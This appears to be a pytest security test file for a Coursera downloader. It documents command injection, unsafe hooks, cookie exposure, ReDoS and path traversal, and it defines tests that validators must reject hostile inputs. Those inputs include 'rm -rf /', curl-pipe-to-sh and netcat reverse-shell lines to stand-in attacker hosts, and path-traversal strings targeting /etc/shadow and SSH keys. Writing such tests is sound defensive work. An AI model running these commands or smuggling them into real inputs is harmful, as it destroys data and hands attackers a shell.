# -*- coding: utf-8 -*-

"""
Security vulnerability tests.

These tests document expected behavior for known security vulnerabilities.
Tests are marked with @pytest.mark.xfail until the security fixes are
implemented, at which point they should pass.

See REPOSITORY_REVIEW.md and SECURITY.md for details on each vulnerability.
"""

import pytest
import os
import subprocess
import tempfile


@pytest.mark.security
class TestCriticalVulnerabilities:
    """
    Tests for CRITICAL severity vulnerabilities.

    These must be fixed before the next minor version release.
    """

    @pytest.mark.xfail(
        reason="CRIT-2 not yet fixed - Command injection via --downloader-arguments",
        strict=False
    )
    def test_command_injection_prevented(self):
        """
        CRIT-2: Downloader arguments must be validated against whitelist.

        Location: coursera/downloaders.py:124-133
        Severity: CRITICAL (CVSS 9.8)
        Impact: Remote Code Execution (RCE)

        The fix should implement:
        1. Whitelist of allowed downloader arguments
        2. Validation before passing to subprocess
        3. Use of shlex.quote() for escaping

        Expected behavior after fix:
        - Malicious arguments should raise ValueError
        - Safe arguments should be allowed
        """
        # This will be implemented in v0.13.0
        # For now, this test documents the expected behavior

        # Attempt 1: Import the validator (will fail until implemented)
        try:
            from coursera.downloaders import validate_downloader_args
        except (ImportError, AttributeError):
            pytest.skip("validate_downloader_args not implemented yet")

        # Attempt 2: Test malicious arguments
        malicious_args = [
            "; rm -rf /",
            "$(whoami)",
            "`cat /etc/passwd`",
            "&& curl http://malware.com/payload | sh",
            "|| nc attacker.com 4444 -e /bin/bash"
        ]

        for arg in malicious_args:
            with pytest.raises(ValueError, match="Disallowed argument"):
                validate_downloader_args([arg])

        # Attempt 3: Test safe arguments (should pass)
        safe_args = [
            "--max-tries=5",
            "--timeout=30",
            "--quiet",
            "--continue"
        ]

        for arg in safe_args:
            # Should not raise
            result = validate_downloader_args([arg])
            assert arg in result or arg.replace('=', ' ') in ' '.join(result)

    @pytest.mark.xfail(
        reason="CRIT-3 not yet fixed - Arbitrary command execution via hooks",
        strict=False
    )
    def test_hook_validation_implemented(self):
        """
        CRIT-3: Hooks should be validated against allowlist.

        Location: coursera/workflow.py:248-255
        Severity: CRITICAL (CVSS 9.1)
        Impact: Complete system compromise

        Expected behavior after fix:
        - Hooks must be absolute paths
        - Hooks must be in allowlist
        - Malicious hooks should raise ValueError
        """
        try:
            from coursera.workflow import validate_hook
        except (ImportError, AttributeError):
            pytest.skip("validate_hook not implemented yet")

        # Malicious hooks should be rejected
        malicious_hooks = [
            "rm -rf ~/",
            "curl http://malware.com/payload | sh",
            "; cat /etc/passwd",
        ]

        for hook in malicious_hooks:
            with pytest.raises(ValueError, match="not in allowlist|absolute path"):
                validate_hook(hook)

    @pytest.mark.xfail(
        reason="CRIT-4 not yet fixed - Cookie credentials exposed to external processes",
        strict=False
    )
    def test_cookies_not_visible_in_process_list(self, temp_course_dir):
        """
        CRIT-4: Session cookies should not be visible via process inspection.

        Location: coursera/downloaders.py:89-103
        Severity: CRITICAL
        Impact: Session hijacking

        Expected behavior after fix:
        - Cookies should be written to temporary file
        - Temp file should have 0o600 permissions
        - Temp file should be deleted after use
        - Command line should reference file, not contain cookie values
        """
        pytest.skip("Implementation required in v0.13.0")

        # This test would verify that when using external downloaders,
        # cookies are passed via temp file, not command line arguments


@pytest.mark.security
class TestHighSeverityIssues:
    """
    Tests for HIGH severity vulnerabilities.

    These should be fixed within 1 month.
    """

    @pytest.mark.xfail(
        reason="HIGH-2 not yet fixed - ReDoS vulnerability",
        strict=False
    )
    def test_regex_timeout_protection(self):
        """
        HIGH-2: Regular expressions should have timeout protection.

        Location: coursera/workflow.py:40-42, filtering.py:108
        Severity: HIGH
        Impact: CPU exhaustion, Denial of Service

        Expected behavior after fix:
        - Regex operations should timeout after 1 second
        - Catastrophic backtracking patterns should not hang
        """
        try:
            from coursera.workflow import search_with_timeout
        except (ImportError, AttributeError):
            pytest.skip("search_with_timeout not implemented yet")

        # Catastrophic backtracking pattern
        bad_pattern = "(a+)+"
        bad_text = "a" * 1000 + "X"

        # Should timeout, not hang forever
        with pytest.raises((TimeoutError, RuntimeError)):
            search_with_timeout(bad_pattern, bad_text, timeout=1)

    @pytest.mark.xfail(
        reason="HIGH-3 not yet fixed - Path traversal vulnerability",
        strict=False
    )
    def test_path_traversal_blocked(self, temp_course_dir):
        """
        HIGH-3: Path traversal should be prevented.

        Location: coursera/formatting.py (multiple functions)
        Severity: HIGH
        Impact: Files written outside intended directory

        Expected behavior after fix:
        - Paths should be validated with os.path.realpath()
        - Attempts to write outside base dir should raise ValueError
        - Symlinks should be detected and rejected
        """
        try:
            from coursera.formatting import safe_join
        except (ImportError, AttributeError):
            pytest.skip("safe_join not implemented yet")

        base_dir = temp_course_dir

        # Path traversal attempts should be blocked
        malicious_paths = [
            "../../../etc/passwd",
            "../../.ssh/authorized_keys",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM"  # Windows
        ]

        for malicious_path in malicious_paths:
            with pytest.raises(ValueError, match="Path traversal"):
                safe_join(base_dir, malicious_path)

    def test_file_permissions_secure(self, temp_course_dir):
        """
        HIGH-1: Default file permissions should be secure.

        Location: coursera/utils.py:171
        Severity: HIGH (FIXED in this PR)
        Impact: Downloaded files readable by all users

        Expected behavior:
        - Directories should be 0o755 (not 0o777)
        - Owner can read/write/execute
        - Group and others can read/execute only
        """
        from coursera import utils

        test_dir = os.path.join(temp_course_dir, "secure_test")
        utils.mkdir_p(test_dir)

        # Get permissions
        stat_info = os.stat(test_dir)
        mode = stat_info.st_mode & 0o777

        # Should be 0o755, not 0o777
        assert mode == 0o755, \
            f"Insecure permissions: expected 0o755, got {oct(mode)}"

        # Specifically check it's NOT world-writable
        world_writable = mode & 0o002
        assert world_writable == 0, \
            "Directory is world-writable (security issue)"


@pytest.mark.security
class TestInputValidation:
    """
    Tests for input validation (general security hygiene).
    """

    def test_filenames_sanitized(self):
        """
        Filenames from API should be sanitized.

        Prevents:
        - Directory traversal via filenames
        - Special characters breaking filesystem
        - Command injection via filenames used in shell commands
        """
        from coursera import utils

        dangerous_filenames = [
            "../../../etc/passwd",
            "file; rm -rf /",
            "file`whoami`.txt",
            "file$(whoami).txt",
            "../../.ssh/id_rsa"
        ]

        for dangerous in dangerous_filenames:
            clean = utils.clean_filename(dangerous)

            # Should not contain directory traversal
            assert ".." not in clean
            # Should not contain shell metacharacters
            assert ";" not in clean
            assert "`" not in clean
            assert "$" not in clean

    @pytest.mark.xfail(
        reason="HIGH-4 not yet fixed - JSON schema validation",
        strict=False
    )
    def test_json_schema_validation(self):
        """
        HIGH-4: API responses should be validated against schema.

        Location: coursera/api.py:90-91
        Severity: HIGH
        Impact: KeyError, type confusion, crashes

        Expected behavior after fix:
        - Invalid JSON should raise ValidationError
        - Missing required fields should be detected
        - Type mismatches should be caught
        """
        pytest.skip("JSON schema validation not implemented yet")

        # Would test that malformed API responses are rejected


@pytest.mark.security
class TestRegressionSecurity:
    """
    Security regression tests.

    These test that previously fixed security issues don't reappear.
    """

    def test_no_hardcoded_credentials(self):
        """
        Ensure no credentials are hardcoded in the codebase.

        This test scans for common patterns that indicate hardcoded secrets.
        """
        import re

        # Common patterns for credentials
        secret_patterns = [
            r'password\s*=\s*["\'][^"\']+["\']',
            r'api_key\s*=\s*["\'][^"\']+["\']',
            r'secret\s*=\s*["\'][^"\']+["\']',
            r'token\s*=\s*["\'][^"\']+["\']',
        ]

        # Files to check
        code_files = []
        coursera_dir = os.path.join(os.path.dirname(__file__), '..')

        for root, dirs, files in os.walk(coursera_dir):
            # Skip test directory and fixtures
            if 'test' in root or 'fixtures' in root:
                continue

            for file in files:
                if file.endswith('.py'):
                    code_files.append(os.path.join(root, file))

        # Scan each file
        for filepath in code_files:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

                for pattern in secret_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)

                    # Filter out test/example values
                    real_matches = [m for m in matches
                                  if 'test' not in m.lower()
                                  and 'example' not in m.lower()
                                  and 'dummy' not in m.lower()]

                    assert len(real_matches) == 0, \
                        f"Found potential hardcoded secret in {filepath}: {real_matches}"

    def test_string_identity_fixed(self):
        """
        Regression: Ensure 'is' operator not used for string literals.

        This was fixed in this PR (api.py:967, 1612).
        Test ensures it doesn't reappear.
        """
        import ast
        import inspect

        from coursera import api

        # Get the source code
        source = inspect.getsource(api)

        # Parse into AST
        tree = ast.parse(source)

        # Find all comparisons using 'is' with string literals
        violations = []

        class IdentityChecker(ast.NodeVisitor):
            def visit_Compare(self, node):
                for op, comparator in zip(node.ops, node.comparators):
                    if isinstance(op, (ast.Is, ast.IsNot)):
                        # Check if comparing with string literal
                        if isinstance(comparator, ast.Str):
                            violations.append(
                                f"Line {node.lineno}: 'is' comparison with string literal"
                            )
                        # Python 3.8+ uses ast.Constant
                        elif isinstance(comparator, ast.Constant) and \
                             isinstance(comparator.value, str):
                            violations.append(
                                f"Line {node.lineno}: 'is' comparison with string literal"
                            )
                self.generic_visit(node)

        IdentityChecker().visit(tree)

        assert len(violations) == 0, \
            f"Found string identity comparisons:\n" + "\n".join(violations)


if __name__ == "__main__":
    # Allow running this file directly for quick testing
    pytest.main([__file__, "-v", "--tb=short"])
